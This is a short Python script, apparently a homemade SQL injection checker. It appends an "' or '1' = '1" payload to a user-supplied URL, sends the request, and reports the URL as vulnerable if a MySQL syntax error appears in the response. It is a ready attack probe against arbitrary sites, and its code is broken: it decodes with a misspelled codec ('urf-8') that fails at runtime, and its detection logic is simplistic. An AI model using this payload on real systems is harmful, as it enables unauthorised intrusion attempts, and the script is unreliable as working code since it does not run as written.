import sys
import urllib
import urllib.request
url = input("INPUT URL HERE TO CHECK VULN: ")
for carg in sys.argv:
    if carg == "-w":
        a = sys.argv.index(carg)
        a+=1
        url = sys.argv[a]
b = urllib.request.urlopen(url + "=1\' or \'1\' = \'1\"")
body = b.read()
webbody = body.decode('urf-8')
if "You have an error in your SQL syntax" in webbody:
    print ("Hello ! The URL you entered is SQL injection vulnerable")
else:
    print("Not vulnerable")